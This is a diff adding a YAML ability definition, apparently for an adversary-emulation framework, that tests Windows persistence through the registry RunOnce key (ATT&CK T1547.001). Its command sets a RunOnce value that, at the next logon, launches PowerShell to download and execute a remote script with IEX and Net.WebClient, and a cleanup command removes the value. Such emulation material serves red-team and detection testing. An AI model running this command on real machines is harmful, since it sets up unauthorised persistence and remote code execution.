@@ -1,0 +1,21 @@
+- description: 'RunOnce Key Persistence via PowerShell
+
+    Upon successful execution, a new entry will be added to the runonce item in the
+    registry.
+
+    '
+  id: 2bfafbee8e3edb25974a5d1aa3d9f431
+  name: PowerShell Registry RunOnce
+  platforms:
+    windows:
+      psh:
+        cleanup: Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce
+          -Name "NextRun" -Force -ErrorAction Ignore
+        command: $RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce";
+          set-itemproperty $RunOnceKey "NextRun" 'powershell.exe "IEX (New-Object
+          Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
+        payloads: []
+  tactic: multiple
+  technique:
+    attack_id: T1547.001
+    name: 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
